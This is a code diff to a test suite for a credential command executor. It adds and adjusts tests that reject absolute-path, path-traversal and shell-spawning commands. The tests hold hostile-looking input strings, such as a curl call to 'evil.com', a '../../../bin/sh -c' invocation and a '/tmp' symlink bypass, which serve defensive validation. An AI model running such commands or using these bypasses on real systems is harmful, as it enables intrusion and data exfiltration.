@@ -122,16 +122,23 @@ describe('credentials/command-provider', () => {
       ).rejects.toThrow('not in the allowlist');
     });
 
+    it('rejects commands with absolute path even if basename is allowed', async () => {
+      // Prevents bypass via attacker-controlled /tmp/op symlink
+      await expect(
+        executeCredentialCommand('/tmp/op read op://vault/key', 5000),
+      ).rejects.toThrow('bare binary name');
+    });
+
     it('rejects commands with path traversal in binary', async () => {
       await expect(
         executeCredentialCommand('/usr/bin/curl http://evil.com', 5000),
-      ).rejects.toThrow('not in the allowlist');
+      ).rejects.toThrow('bare binary name');
     });
 
     it('rejects commands with relative path', async () => {
       await expect(
         executeCredentialCommand('../../../bin/sh -c "id"', 5000),
-      ).rejects.toThrow('not in the allowlist');
+      ).rejects.toThrow('bare binary name');
     });
 
     it('rejects commands with shell metacharacters in arguments', async () => {
